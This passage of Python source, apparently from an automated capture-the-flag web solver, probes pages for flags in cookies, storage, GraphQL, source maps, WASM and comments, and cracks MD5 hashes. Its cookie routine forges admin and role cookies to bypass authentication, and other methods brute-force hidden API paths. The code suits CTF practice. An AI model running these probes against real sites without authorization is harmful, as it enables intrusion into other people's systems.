                    return flag
                
                # Try decoding cookie value (Base64, Hex, URL encoding, etc.)
                decoded_results = CTFDecoder.try_all_decodings(cookie.value, None)
                for decoded in decoded_results:
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Found decoded flag in cookie: {cookie.name}")
                        return flag
                
                # Check if it's a JWT
                jwt_data = CTFDecoder.decode_jwt(cookie.value)
                if jwt_data:
                    result.add_log(f"Found JWT in cookie: {cookie.name}")
                    payload = jwt_data.get('payload', {})
                    for key, value in payload.items():
                        if isinstance(value, str):
                            flag = self.extract_flag(value)
                            if flag:
                                return flag
                
                # Check if cookie value is a hash
                if re.match(r'^[a-f0-9]{32}$', cookie.value.lower()):
                    result.add_log(f"Cookie {cookie.name} looks like MD5 hash")
                    cracked = CTFDecoder.crack_hash(cookie.value, 'md5')
                    if cracked:
                        result.add_log(f"Cracked cookie hash: {cracked}")
                        return cracked
            
            # PRIORITY 2: Try cookie manipulation attacks
            result.add_log("Trying cookie manipulation attacks...")
            
            # Common cookie names to test
            cookie_tests = [
                ('admin', 'true'),
                ('admin', '1'),
                ('admin', 'True'),
                ('isAdmin', 'true'),
                ('isAdmin', '1'),
                ('role', 'admin'),
                ('role', 'administrator'),
                ('user', 'admin'),
                ('username', 'admin'),
                ('auth', 'true'),
                ('authenticated', 'true'),
                ('logged_in', 'true'),
                ('session', 'admin'),
                ('privilege', 'admin'),
                ('access_level', '999'),
                ('access_level', 'admin'),
            ]
            
            for cookie_name, cookie_value in cookie_tests:
                # Set the cookie
                self.session.cookies.set(cookie_name, cookie_value)
                try:
                    test_response = self.session.get(url, timeout=5)
                    flag = self.extract_flag(test_response.text)
                    if flag:
                        result.add_log(f"Cookie manipulation successful: {cookie_name}={cookie_value}")
                        return flag
                    
                    # Check if we got elevated access
                    if any(keyword in test_response.text.lower() for keyword in ['admin', 'dashboard', 'secret', 'flag', 'congratulations']):
                        result.add_log(f"Possible elevated access with: {cookie_name}={cookie_value}")
                        flag = self.extract_flag(test_response.text)
                        if flag:
                            return flag
                except:
                    pass
                finally:
                    # Remove test cookie
                    self.session.cookies.pop(cookie_name, None)
            
            # PRIORITY 3: Try modifying existing cookies
            for cookie in list(self.session.cookies):
                original_value = cookie.value
                
                # Try boolean flips
                if cookie.value.lower() in ['false', '0', 'no']:
                    test_values = ['true', '1', 'yes', 'True', 'TRUE']
                elif cookie.value.lower() in ['true', '1', 'yes']:
                    test_values = ['false', '0', 'no']
                elif cookie.value.lower() == 'user':
                    test_values = ['admin', 'administrator', 'root']
                elif cookie.value.isdigit():
                    # Try incrementing/decrementing numbers
                    num = int(cookie.value)
                    test_values = [str(num + 1), str(num - 1), '999', '0', '1']
                else:
                    test_values = []
                
                for test_value in test_values:
                    self.session.cookies.set(cookie.name, test_value)
                    try:
                        test_response = self.session.get(url, timeout=5)
                        flag = self.extract_flag(test_response.text)
                        if flag:
                            result.add_log(f"Cookie modification successful: {cookie.name}={test_value}")
                            return flag
                    except:
                        pass
                    finally:
                        # Restore original value
                        self.session.cookies.set(cookie.name, original_value)
            
            # PRIORITY 4: Check Set-Cookie headers
            set_cookies = response.headers.get('Set-Cookie', '')
            flag = self.extract_flag(set_cookies)
            if flag:
                result.add_log("Found flag in Set-Cookie header")
                return flag
            
            # PRIORITY 5: Look for localStorage/sessionStorage references in JS
            soup = BeautifulSoup(response.text, 'html.parser')
            for script in soup.find_all('script'):
                if script.string:
                    # Look for localStorage.setItem patterns
                    storage_patterns = [
                        r'localStorage\.setItem\s*\(\s*[\'"]([^\'"]+)[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
                        r'sessionStorage\.setItem\s*\(\s*[\'"]([^\'"]+)[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
                        r'localStorage\[[\'"]([^\'"]+)[\'"]\]\s*=\s*[\'"]([^\'"]+)[\'"]',
                        r'sessionStorage\[[\'"]([^\'"]+)[\'"]\]\s*=\s*[\'"]([^\'"]+)[\'"]',
                        r'localStorage\.([a-zA-Z_]+)\s*=\s*[\'"]([^\'"]+)[\'"]',
                    ]
                    
                    for pattern in storage_patterns:
                        matches = re.findall(pattern, script.string)
                        for match in matches:
                            if len(match) == 2:
                                key, value = match
                                result.add_log(f"Found storage: {key} = {value[:50]}...")
                                flag = self.extract_flag(value)
                                if flag:
                                    result.add_log(f"Found flag in localStorage: {key}")
                                    return flag
                                
                                # Try decoding storage value
                                decoded_results = CTFDecoder.try_all_decodings(value, None)
                                for decoded in decoded_results:
                                    flag = self.extract_flag(decoded)
                                    if flag:
                                        result.add_log(f"Found decoded flag in localStorage: {key}")
                                        return flag
            
            # PRIORITY 6: Check for cookie-based authentication bypass hints
            # Look for comments about cookies
            comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
            for comment in comments:
                if 'cookie' in comment.lower():
                    result.add_log(f"Found cookie hint in comment: {comment[:100]}...")
                    flag = self.extract_flag(comment)
                    if flag:
                        return flag
            
        except Exception as e:
            result.add_log(f"Cookie check error: {e}")
        
        return None
    
    def _check_websocket_messages(self, url: str, result: ChallengeResult) -> str:
        """Check for WebSocket endpoints and messages"""
        result.add_log("Checking WebSocket endpoints...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Look for WebSocket URLs in the page
            ws_patterns = [
                r'wss?://[^\s\'"<>]+',
                r'new\s+WebSocket\s*\(\s*[\'"]([^\'"]+)[\'"]',
                r'\.connect\s*\(\s*[\'"]wss?://([^\'"]+)[\'"]',
            ]
            
            ws_urls = set()
            for pattern in ws_patterns:
                matches = re.findall(pattern, response.text)
                ws_urls.update(matches)
            
            if ws_urls:
                result.add_log(f"Found {len(ws_urls)} WebSocket URLs")
                
                # Try to connect and receive messages
                try:
                    import websocket
                    
                    for ws_url in ws_urls:
                        if not ws_url.startswith('ws'):
                            ws_url = 'wss://' + ws_url
                        
                        result.add_log(f"Connecting to WebSocket: {ws_url}")
                        
                        try:
                            ws = websocket.create_connection(ws_url, timeout=5)
                            
                            # Try to receive a message
                            ws.settimeout(3)
                            try:
                                message = ws.recv()
                                result.add_log(f"Received: {message[:100]}...")
                                
                                flag = self.extract_flag(message)
                                if flag:
                                    ws.close()
                                    return flag
                            except:
                                pass
                            
                            # Try sending common messages
                            test_messages = ['flag', 'getFlag', 'secret', '{"action":"getFlag"}']
                            for msg in test_messages:
                                try:
                                    ws.send(msg)
                                    response_msg = ws.recv()
                                    flag = self.extract_flag(response_msg)
                                    if flag:
                                        ws.close()
                                        return flag
                                except:
                                    pass
                            
                            ws.close()
                        except:
                            pass
                except ImportError:
                    result.add_log("WebSocket library not available")
            
            # Also check for Socket.IO
            socketio_patterns = [
                r'io\s*\(\s*[\'"]([^\'"]+)[\'"]',
                r'socket\.io',
            ]
            
            for pattern in socketio_patterns:
                if re.search(pattern, response.text):
                    result.add_log("Found Socket.IO reference")
                    break
        except:
            pass
        
        return None
    
    def _check_graphql_introspection(self, url: str, result: ChallengeResult) -> str:
        """Check for GraphQL endpoints and perform introspection"""
        result.add_log("Checking GraphQL endpoints...")
        
        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/gql']
        base_url = url.rstrip('/')
        
        introspection_query = '''
        {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
        '''
        
        for path in graphql_paths:
            try:
                graphql_url = base_url + path
                
                # Try introspection
                response = self.session.post(
                    graphql_url,
                    json={'query': introspection_query},
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    result.add_log(f"GraphQL endpoint found at {path}")
                    
                    # Look for flag-related types/fields
                    flag_queries = []
                    if 'data' in data and '__schema' in data['data']:
                        types = data['data']['__schema'].get('types', [])
                        for t in types:
                            name = t.get('name', '').lower()
                            if any(x in name for x in ['flag', 'secret', 'key', 'admin']):
                                flag_queries.append(t['name'])
                            
                            fields = t.get('fields') or []
                            for f in fields:
                                fname = f.get('name', '').lower()
                                if any(x in fname for x in ['flag', 'secret', 'key', 'password']):
                                    flag_queries.append(f"{t['name']}.{f['name']}")
                    
                    # Try to query flag-related fields
                    for query_name in flag_queries:
                        try:
                            if '.' in query_name:
                                type_name, field_name = query_name.split('.')
                                query = f'{{ {field_name} }}'
                            else:
                                query = f'{{ {query_name} }}'
                            
                            resp = self.session.post(
                                graphql_url,
                                json={'query': query},
                                headers={'Content-Type': 'application/json'},
                                timeout=5
                            )
                            
                            if resp.status_code == 200:
                                flag = self.extract_flag(resp.text)
                                if flag:
                                    result.add_log(f"Found flag via GraphQL query: {query_name}")
                                    return flag
                        except:
                            pass
            except:
                pass
        
        return None
    
    def _check_service_workers(self, url: str, result: ChallengeResult) -> str:
        """Check service workers for hidden data"""
        result.add_log("Checking service workers...")
        
        sw_paths = ['/sw.js', '/service-worker.js', '/serviceworker.js', '/worker.js']
        base_url = url.rstrip('/')
        
        for path in sw_paths:
            try:
                sw_url = base_url + path
                response = self.session.get(sw_url, timeout=5)
                
                if response.status_code == 200:
                    result.add_log(f"Found service worker: {path}")
                    
                    # Check for flags
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                    
                    # Check for hidden data in SW
                    flag = self._extract_js_secrets(response.text, result)
                    if flag:
                        return flag
                    
                    # Look for cached URLs
                    cache_patterns = [
                        r'cache\.addAll\s*\(\s*\[([^\]]+)\]',
                        r'cache\.add\s*\(\s*[\'"]([^\'"]+)[\'"]',
                        r'[\'"]([^\'"/]+\.(?:txt|json|html|flag))[\'"]',
                    ]
                    
                    for pattern in cache_patterns:
                        matches = re.findall(pattern, response.text)
                        for match in matches:
                            if isinstance(match, str):
                                urls = [match]
                            else:
                                urls = re.findall(r'[\'"]([^\'"]+)[\'"]', match)
                            
                            for cached_url in urls:
                                if 'flag' in cached_url.lower() or 'secret' in cached_url.lower():
                                    try:
                                        full_url = urljoin(base_url, cached_url)
                                        resp = self.session.get(full_url, timeout=5)
                                        flag = self.extract_flag(resp.text)
                                        if flag:
                                            result.add_log(f"Found flag in cached URL: {cached_url}")
                                            return flag
                                    except:
                                        pass
            except:
                pass
        
        return None
    
    def _check_source_maps(self, url: str, result: ChallengeResult) -> str:
        """Check JavaScript source maps for hidden data"""
        result.add_log("Checking source maps...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all JS files
            js_files = []
            for script in soup.find_all('script', src=True):
                js_files.append(script['src'])
            
            base_url = url.rstrip('/')
            
            for js_file in js_files:
                try:
                    js_url = urljoin(base_url, js_file)
                    js_response = self.session.get(js_url, timeout=5)
                    
                    if js_response.status_code == 200:
                        # Look for sourceMappingURL
                        sourcemap_match = re.search(r'//[#@]\s*sourceMappingURL=([^\s]+)', js_response.text)
                        
                        if sourcemap_match:
                            map_url = sourcemap_match.group(1)
                            full_map_url = urljoin(js_url, map_url)
                            
                            result.add_log(f"Found source map: {map_url}")
                            
                            map_response = self.session.get(full_map_url, timeout=5)
                            if map_response.status_code == 200:
                                # Check source map for flags
                                flag = self.extract_flag(map_response.text)
                                if flag:
                                    return flag
                                
                                # Parse source map JSON
                                try:
                                    map_data = map_response.json()
                                    
                                    # Check sources
                                    sources = map_data.get('sources', [])
                                    for source in sources:
                                        if 'flag' in source.lower() or 'secret' in source.lower():
                                            result.add_log(f"Interesting source: {source}")
                                    
                                    # Check sourcesContent
                                    contents = map_data.get('sourcesContent', [])
                                    for content in contents:
                                        if content:
                                            flag = self.extract_flag(content)
                                            if flag:
                                                return flag
                                            
                                            flag = self._extract_js_secrets(content, result)
                                            if flag:
                                                return flag
                                except:
                                    pass
                except:
                    pass
        except:
            pass
        
        return None
    
    def _check_wasm_modules(self, url: str, result: ChallengeResult) -> str:
        """Check WebAssembly modules for hidden data"""
        result.add_log("Checking WebAssembly modules...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Look for WASM file references
            wasm_patterns = [
                r'[\'"]([^\'"]+\.wasm)[\'"]',
                r'WebAssembly\.instantiate\w*\s*\([^)]*[\'"]([^\'"]+)[\'"]',
            ]
            
            wasm_files = set()
            for pattern in wasm_patterns:
                matches = re.findall(pattern, response.text)
                wasm_files.update(matches)
            
            base_url = url.rstrip('/')
            
            for wasm_file in wasm_files:
                try:
                    wasm_url = urljoin(base_url, wasm_file)
                    wasm_response = self.session.get(wasm_url, timeout=10)
                    
                    if wasm_response.status_code == 200:
                        result.add_log(f"Found WASM module: {wasm_file}")
                        
                        # Extract strings from WASM binary
                        strings = CTFDecoder.extract_strings_from_binary(wasm_response.content, min_length=5)
                        
                        for s in strings:
                            flag = self.extract_flag(s)
                            if flag:
                                result.add_log(f"Found flag in WASM: {flag}")
                                return flag
                            
                            # Check for flag-like patterns
                            if any(x in s.lower() for x in ['flag', 'secret', 'key', 'ctf']):
                                result.add_log(f"Interesting string in WASM: {s}")
                except:
                    pass
        except:
            pass
        
        return None
    
    def _check_console_logs(self, url: str, result: ChallengeResult) -> str:
        """Check for console.log statements that might reveal flags"""
        result.add_log("Checking console.log statements...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            all_js = ""
            
            # Collect all JS
            for script in soup.find_all('script'):
                if script.string:
                    all_js += script.string + "\n"
                elif script.get('src'):
                    try:
                        js_url = urljoin(url, script['src'])
                        js_response = self.session.get(js_url, timeout=5)
                        if js_response.status_code == 200:
                            all_js += js_response.text + "\n"
                    except:
                        pass
            
            # Look for console.log with interesting content
            console_patterns = [
                r'console\.log\s*\(\s*[\'"]([^\'"]+)[\'"]',
                r'console\.log\s*\(\s*`([^`]+)`',
                r'console\.info\s*\(\s*[\'"]([^\'"]+)[\'"]',
                r'console\.debug\s*\(\s*[\'"]([^\'"]+)[\'"]',
            ]
            
            for pattern in console_patterns:
                matches = re.findall(pattern, all_js)
                for match in matches:
                    # Check for flags
                    flag = self.extract_flag(match)
                    if flag:
                        result.add_log(f"Found flag in console.log")
                        return flag
                    
                    # Check for encoded data
                    decoded_results = CTFDecoder.try_all_decodings(match, None)
                    for decoded in decoded_results:
                        flag = self.extract_flag(decoded)
                        if flag:
                            return flag
        except:
            pass
        
        return None
    
    def _try_crack_js_hashes(self, js_content: str, result: ChallengeResult, base_url: str = None) -> str:
        """Try to crack MD5 hashes found in JavaScript"""
        # Find MD5 hashes
        md5_pattern = r'[a-fA-F0-9]{32}'
        md5_hashes = set(re.findall(md5_pattern, js_content))
        
        if not md5_hashes:
            return None
        
        # Check if this is a hash cracking challenge with server validation
        has_submit_endpoint = 'submit' in js_content.lower() or '/submit' in js_content
        has_hash_challenge = 'hash' in js_content.lower() and ('crack' in js_content.lower() or 'decode' in js_content.lower() or 'md5' in js_content.lower())
        
        # Look for XOR key hints - check multiple patterns
        xor_key = None
        xor_patterns = [
            r'xor[_\s]*key[:\s=]*(\d+)',
            r'key[:\s=]*(\d+)',
            r'XOR\s+key\s+is\s+(\d+)',
            r'XORed?\s+with\s+(\d+)',
        ]
        for pattern in xor_patterns:
            xor_match = re.search(pattern, js_content, re.IGNORECASE)
            if xor_match:
                xor_key = int(xor_match.group(1))
                result.add_log(f"Found XOR key hint: {xor_key}")
                break
        
        # If this is a hash challenge with submit endpoint, we need to validate with server
        if has_submit_endpoint and has_hash_challenge and base_url:
            result.add_log("Detected hash cracking challenge with server validation")
            
            # Try to crack hashes and validate with server
            cracked_candidates = []
            for hash_val in md5_hashes:
                result.add_log(f"Trying to crack hash: {hash_val[:16]}...")
                cracked = CTFDecoder.crack_md5(hash_val, xor_key)
                if cracked:
                    cracked_candidates.append(cracked)
            
            # Try each candidate with the server
            submit_endpoints = [
                '/.netlify/functions/submit',
                '/submit',
                '/api/submit',
                '/api/v1/submit',
            ]
            
            for candidate in cracked_candidates:
                result.add_log(f"Validating candidate: {candidate}")
                for endpoint in submit_endpoints:
                    try:
                        submit_url = urljoin(base_url, endpoint)
                        resp = self.session.post(submit_url, json={'plaintext': candidate}, timeout=5)
                        if resp.status_code == 200:
                            data = resp.json()
                            if data.get('success'):
                                flag = data.get('flag', candidate)
                                result.add_log(f"Server validated! Flag: {flag}")
                                return flag
                            else:
                                result.add_log(f"Server rejected: {candidate} - {data.get('message', 'Invalid')}")
                    except:
                        pass
            
            # If no candidate was validated, this challenge requires actual hash cracking
            # that our wordlist doesn't cover - return None to let other methods try
            result.add_log("No cracked hash passed server validation - challenge may require extended wordlist")
            return None
        
        # Standard hash cracking without server validation
        for hash_val in md5_hashes:
            result.add_log(f"Trying to crack hash: {hash_val[:16]}...")
            cracked = CTFDecoder.crack_md5(hash_val, xor_key)
            if cracked:
                result.add_log(f"Cracked hash: {cracked}")
                return cracked
        
        return None
    
    def _try_api_endpoints(self, url: str, result: ChallengeResult) -> str:
        """Try common API endpoints for flags"""
        result.add_log("Checking API endpoints...")
        
        api_paths = [
            '/api/flag', '/api/secret', '/api/key', '/api/admin',
            '/api/v1/flag', '/api/v1/secret', '/api/v1/admin',
            '/.netlify/functions/flag', '/.netlify/functions/secret',
            '/.netlify/functions/getFlag', '/.netlify/functions/admin',
            '/flag.json', '/secret.json', '/config.json', '/data.json',
            '/api', '/graphql', '/rest', '/v1', '/v2',
        ]
        
        base_url = url.rstrip('/')
        
        for path in api_paths:
            try:
                api_url = base_url + path
                response = self.session.get(api_url, timeout=5)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag at API: {path}")
                        return flag
                    
                    # Try to parse JSON response
                    try:
                        data = response.json()
                        flag = self._search_json_for_flag(data, result)
                        if flag:
                            return flag
                    except:
                        pass
            except:
                pass
        
        return None
    
    def _search_json_for_flag(self, data: Any, result: ChallengeResult) -> str:
        """Recursively search JSON data for flags"""
        if isinstance(data, str):
            flag = self.extract_flag(data)
            if flag:
                return flag
            if CTFDecoder._looks_english(data) and len(data) > 5:
                return data
        elif isinstance(data, dict):
            for key, value in data.items():
                if 'flag' in key.lower() or 'secret' in key.lower() or 'key' in key.lower():
                    if isinstance(value, str):
                        return value
                flag = self._search_json_for_flag(value, result)
                if flag:
                    return flag
        elif isinstance(data, list):
            for item in data:
                flag = self._search_json_for_flag(item, result)
                if flag:
                    return flag
        return None
    
    def _check_meta_tag_hash(self, soup: BeautifulSoup, html_content: str, result: ChallengeResult) -> str:
        """Check for hash derivation from meta tags (like idiotmute challenge)"""
        
        # Look for meta tags with mx-a, mx-b, mx-c, mx-d pattern (hash fragments)
        mx_tags = {}
        for meta in soup.find_all('meta'):
            name = meta.get('name', '')
            content = meta.get('content', '')
            if name.startswith('mx-') and content:
                mx_tags[name] = content
        
        if len(mx_tags) >= 4:
            result.add_log(f"Found {len(mx_tags)} mx- meta tags (potential hash fragments)")
            
            # Try to derive hash like idiotmute does
            # mx-a: "8c0415fd-x" -> remove "-x" -> "8c0415fd"
            # mx-b: "1983ace7"
            # mx-c: "e658c4f4"
            # mx-d: "fa5e5587"
            
            a = mx_tags.get('mx-a', '').replace('-x', '')
            b = mx_tags.get('mx-b', '')
            c = mx_tags.get('mx-c', '')
            d = mx_tags.get('mx-d', '')
            
            if a and b and c and d:
                # Derive hash using the same algorithm as idiotmute
                p1 = a[:8] + b[:4]
                p2 = b[4:] + c[:4]
                p3 = c[4:] + d[:4]
                p4 = d[4:]
                derived_hash = p1 + p2 + p3 + p4
                
                result.add_log(f"Derived hash from meta tags: {derived_hash}")
                
                # Check if it's a valid MD5 hash (32 hex chars)
                if len(derived_hash) == 32 and all(c in '0123456789abcdef' for c in derived_hash.lower()):
                    result.add_log(f"Valid MD5 hash found: {derived_hash}")
                    
                    # Try to crack the hash
                    cracked = CTFDecoder.crack_hash(derived_hash, 'md5')
                    if cracked:
                        result.add_log(f"Cracked hash: {cracked}")
                        return cracked
                    
                    # If can't crack, return the hash itself as the flag
                    return derived_hash
        
        # Also check for other meta tag patterns that might contain flags
        for meta in soup.find_all('meta'):
            name = meta.get('name', '').lower()
            content = meta.get('content', '')
            
            # Skip fake/decoy hashes
            if 'fake' in name or 'decoy' in name:
                continue
            
            # Check if content looks like a flag
            if content:
                flag = self.extract_flag(content)
                if flag and not self._is_decoy_flag(flag, html_content):
                    result.add_log(f"Found flag in meta tag {name}")
                    return flag
        
        return None
    
    def _extract_js_hints(self, js_content: str, result: ChallengeResult) -> str:
        """Extract hints and hidden data from JS comments and code"""
        # Look for MD5 hashes
        md5_pattern = r'[a-fA-F0-9]{32}'
        md5_matches = re.findall(md5_pattern, js_content)
        for md5 in md5_matches:
            result.add_log(f"Found MD5 hash in JS: {md5}")
        
        # Look for hints in JS comments
        js_comments = re.findall(r'//(.+?)$|/\*(.*?)\*/', js_content, re.MULTILINE | re.DOTALL)
        for comment in js_comments:
            comment_text = comment[0] or comment[1]
            if comment_text:
                # Check for hint keywords
                if any(word in comment_text.lower() for word in ['hint', 'flag', 'secret', 'url', 'path', 'mission']):
                    result.add_log(f"Found hint in JS comment: {comment_text[:100].strip()}...")
                    
                    # Look for URL paths mentioned in hints
                    path_match = re.search(r'[/\\](\w+)', comment_text)
                    if path_match:
                        hint_path = '/' + path_match.group(1)
                        result.add_log(f"Hint suggests path: {hint_path}")
                
                # Check for encoded data in comments
                flag = self.extract_flag(comment_text)
                if flag:
                    return flag
                
                # Try decoding any encoded strings in comments
                decoded_results = CTFDecoder.try_all_decodings(comment_text.strip(), None)
                for decoded in decoded_results:
                    flag = self.extract_flag(decoded)
                    if flag:
                        return flag
        
        # Look for audio/morse references
        if 'morse' in js_content.lower() or '.wav' in js_content.lower():
            result.add_log("Found reference to Morse code or audio file")
            # Look for audio file paths
            audio_matches = re.findall(r'["\']([^"\']*\.(?:wav|mp3|ogg))["\']', js_content, re.IGNORECASE)
            for audio_path in audio_matches:
                result.add_log(f"Found audio file reference: {audio_path}")
        
        return None
    
    def _follow_hint_paths(self, url: str, js_content: str, html_content: str, result: ChallengeResult) -> str:
        """Follow paths mentioned in hints/comments - lightweight version for quick solving"""
        result.add_log("Following hint paths...")
        
        hint_paths = set()
        
        # Extract paths from JS comments
        js_comments = re.findall(r'//(.+?)$|/\*(.*?)\*/', js_content, re.MULTILINE | re.DOTALL)
        for comment in js_comments:
            comment_text = comment[0] or comment[1]
            if comment_text:
                # Look for path-like patterns in comments
                # Match /Path, /path-name, /Path Name (with spaces)
                path_patterns = [
                    r'(/[A-Za-z][A-Za-z0-9\s\-_]+)',  # /For Real, /secret-path
                    r'path[:\s]+["\']?(/[^"\'<>\s]+)',  # path: /something
                    r'go\s+to\s+["\']?(/[^"\'<>\s]+)',  # go to /path
                    r'check\s+["\']?(/[^"\'<>\s]+)',  # check /path
                    r'visit\s+["\']?(/[^"\'<>\s]+)',  # visit /path
                ]
                for pattern in path_patterns:
                    matches = re.findall(pattern, comment_text, re.IGNORECASE)
                    for match in matches:
                        path = match.strip()
                        if len(path) > 1 and path != '/':
                            hint_paths.add(path)
                            # Also add URL-encoded version for paths with spaces
                            if ' ' in path:
                                hint_paths.add(path.replace(' ', '%20'))
        
        # Extract paths from HTML comments
        html_comments = re.findall(r'<!--(.*?)-->', html_content, re.DOTALL)
        for comment in html_comments:
            for pattern in [r'(/[A-Za-z][A-Za-z0-9\s\-_]+)', r'path[:\s]+(/[^\s<>]+)']:
                matches = re.findall(pattern, comment, re.IGNORECASE)
                for match in matches:
                    path = match.strip()
                    if len(path) > 1 and path != '/':
                        hint_paths.add(path)
                        if ' ' in path:
                            hint_paths.add(path.replace(' ', '%20'))
        
        # Add common CTF hint paths that might be referenced
        common_hint_paths = ['/For Real', '/For%20Real', '/secret', '/hidden', '/flag', '/next', '/step2']
        for path in common_hint_paths:
            hint_paths.add(path)
        
        base_url = url.rstrip('/')
        
        # Try each hint path (limit to 15 for speed)
        for path in list(hint_paths)[:15]:
            try:
                test_url = base_url + path
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 20:
                    result.add_log(f"Found hint path: {path}")
                    
                    # PRIORITY 1: Check CSS comments for numbered fragments (common CTF pattern)
                    # Do this FIRST before extract_flag which might match partial patterns
                    flag = self._extract_css_fragments_from_page(response.text, result)
                    if flag:
                        result.add_log(f"Found CSS fragment flag at hint path {path}")
                        return flag
                    
                    # PRIORITY 2: Check for direct flag (but only well-formed ones)
                    flag = self.extract_flag(response.text)
                    if flag and '{' in flag and '}' in flag:
                        # Validate the flag is complete (has matching braces)
                        if flag.count('{') == flag.count('}'):
                            result.add_log(f"Found flag at hint path {path}")
                            return flag
                    
                    # Check for Base64 fragments in the page (common in CTF challenges)
                    flag = self._extract_base64_from_page(response.text, result)
                    if flag:
                        result.add_log(f"Found Base64 flag at hint path {path}")
                        return flag
                    
                    # Check HTML comments on the hint page
                    page_comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
                    for comment in page_comments:
                        flag = self.extract_flag(comment)
                        if flag:
                            return flag
                        # Try Base64 decode
                        b64_flag = self._extract_base64_fragments(comment, result)
                        if b64_flag:
                            return b64_flag
                    
                    # Check inline scripts on hint page
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for script in soup.find_all('script'):
                        if script.string:
                            flag = self.extract_flag(script.string)
                            if flag:
                                return flag
                            # Check for Base64 in script
                            flag = self._extract_base64_from_page(script.string, result)
                            if flag:
                                return flag
                        # Check external JS files on hint pages
                        src = script.get('src')
                        if src:
                            try:
                                js_url = urljoin(test_url, src)
                                js_response = self.session.get(js_url, timeout=5)
                                if js_response.status_code == 200:
                                    # Look for FRAGMENTS array with Base64 tokens
                                    fragments_match = re.search(r'FRAGMENTS\s*=\s*\[(.*?)\]', js_response.text, re.DOTALL)
                                    if fragments_match:
                                        b64_tokens = re.findall(r"'([A-Za-z0-9+/=]+)'", fragments_match.group(1))
                                        for token in b64_tokens:
                                            try:
                                                decoded = base64.b64decode(token).decode('utf-8', errors='ignore')
                                                if decoded and len(decoded) >= 3:
                                                    result.add_log(f"Found Base64 token in JS: {token} -> {decoded}")
                                                    # This is likely the real flag for this type of challenge
                                                    return decoded
                                            except:
                                                pass
                                    # Also check for direct flags
                                    flag = self.extract_flag(js_response.text)
                                    if flag:
                                        return flag
                            except:
                                pass
                    
                    # PRIORITY: Check for audio files (morse code) on hint pages
                    audio_tags = soup.find_all(['audio', 'source'])
                    for audio in audio_tags:
                        src = audio.get('src')
                        if src:
                            result.add_log(f"Found audio file on hint page: {src}")
                            audio_url = urljoin(test_url, src)
                            try:
                                audio_response = self.session.get(audio_url, timeout=15)
                                if audio_response.status_code == 200:
                                    result.add_log(f"Downloaded audio ({len(audio_response.content)} bytes)")
                                    decoded = CTFDecoder.decode_morse_audio(audio_response.content)
                                    if decoded:
                                        result.add_log(f"Decoded morse from audio: {decoded}")
                                        return decoded
                            except Exception as e:
                                result.add_log(f"Error with audio: {e}")
            except Exception as e:
                pass
        
        return None
    
    def _extract_css_fragments_from_page(self, content: str, result: ChallengeResult) -> str:
        """Extract and combine numbered Base64 fragments from CSS comments"""
        # Pattern: /* Fragment N: BASE64 (description) - scattered in code */
        fragment_pattern = r'/\*\s*Fragment\s*(\d+):\s*([A-Za-z0-9+/=]+)\s*\([^)]*\)[^*]*\*/'
        matches = re.findall(fragment_pattern, content, re.IGNORECASE)
        
        if matches:
            # Sort by fragment number and decode
            fragments = []
            for num_str, b64_data in matches:
                try:
                    num = int(num_str)
                    # Add padding if needed
                    padded = b64_data
                    padding = 4 - len(padded) % 4
                    if padding != 4:
                        padded += '=' * padding
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    if decoded:
                        fragments.append((num, decoded))
                        result.add_log(f"CSS Fragment {num}: {b64_data} -> {decoded}")
                except:
                    pass
            
            if fragments:
                # Sort by fragment number and combine
                fragments.sort(key=lambda x: x[0])
                combined = ''.join(f[1] for f in fragments)
                result.add_log(f"Combined CSS fragments: {combined}")
                
                # Check if it's a flag
                flag = self.extract_flag(combined)
                if flag:
                    return flag
                
                # Return if it looks like a meaningful answer
                if combined and len(combined) >= 4:
                    return combined
        
        return None
    
    def _extract_base64_from_page(self, content: str, result: ChallengeResult) -> str:
        """Extract and decode Base64 fragments from page content"""
        # Look for Base64 patterns (at least 8 chars, valid base64)
        b64_pattern = r'(?<![A-Za-z0-9+/])([A-Za-z0-9+/]{8,}={0,2})(?![A-Za-z0-9+/])'
        matches = re.findall(b64_pattern, content)
        
        for match in matches:
            try:
                # Add padding if needed
                padded = match
                padding = 4 - len(padded) % 4
                if padding != 4:
                    padded += '=' * padding
                
                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                
                # Check if decoded looks like a flag or readable text
                if decoded and len(decoded) >= 3:
                    # Check for flag pattern
                    flag = self.extract_flag(decoded)
                    if flag:
                        result.add_log(f"Base64 decoded to flag: {decoded}")
                        return flag
                    
                    # Check if it's readable text (potential answer)
                    if CTFDecoder._looks_english(decoded) and len(decoded) >= 4:
                        result.add_log(f"Base64 decoded to: {decoded}")
                        # Return if it looks like a meaningful answer
                        if any(word in decoded.lower() for word in ['floor', 'level', 'flag', 'key', 'secret', 'answer', 'congrat']):
                            return decoded
                        # Also return short readable phrases that could be flags
                        if len(decoded) <= 30 and decoded.replace(' ', '').isalnum():
                            return decoded
            except:
                pass
        
        return None
    
    def _extract_css_secrets(self, css_content: str, result: ChallengeResult) -> str:
        """Extract hidden data from CSS comments, variables, and base64 fragments"""
        
        # PRIORITY 0: Check for CSS custom property payload fragments (--p1, --p2, etc.)
        # Pattern like: --p1: Zmly; --p2: ZSBo; etc.
        payload_var_pattern = r'--p(\d+)\s*:\s*([A-Za-z0-9+/=]+)\s*;'
        payload_matches = re.findall(payload_var_pattern, css_content)
        if payload_matches:
            # Sort by number and combine
            payload_matches.sort(key=lambda x: int(x[0]))
